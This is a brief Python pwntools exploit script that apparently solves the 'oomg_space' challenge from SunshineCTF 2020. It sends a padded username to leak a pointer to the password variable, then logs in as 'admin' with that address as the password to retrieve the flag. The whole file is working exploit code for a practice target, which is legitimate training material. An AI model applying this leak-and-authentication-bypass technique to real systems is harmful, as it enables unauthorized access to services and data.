#!/usr/bin/env python3
from pwn import *

exe = ELF("oomg_space", checksec=False)
context(binary=exe)
# context.log_level = "debug"


REMOTE = 1
if REMOTE:
	r = remote("chal.2020.sunshinectf.org", 20001)
else:
	r = exe.process()
	# gdb.attach(r, "c")

r.recvuntil(b"USER\n")

r.send(b"A" * 16)
r.recvuntil(b"BAD USER " + b"A" * 16)

leak = r.recvuntil(b"\nAGAIN\n", drop=True)
if len(leak) <= 4:
	error("Leak size (%d) is suspiciously low, try running again" % len(leak))

target_addr = u64(leak + b"\x00" * (8 - len(leak)))

info("&password is at 0x%x" % target_addr)

r.recvuntil(b"USER\n")
r.send(b"admin" + b"\x00" * (16 - 5))

r.recvuntil(b"PASSWORD\n")
r.send(p64(target_addr, endian="big"))
r.send(b"A")

print(r.recvline_contains(b"FLAG ", timeout=1).decode("utf8"))
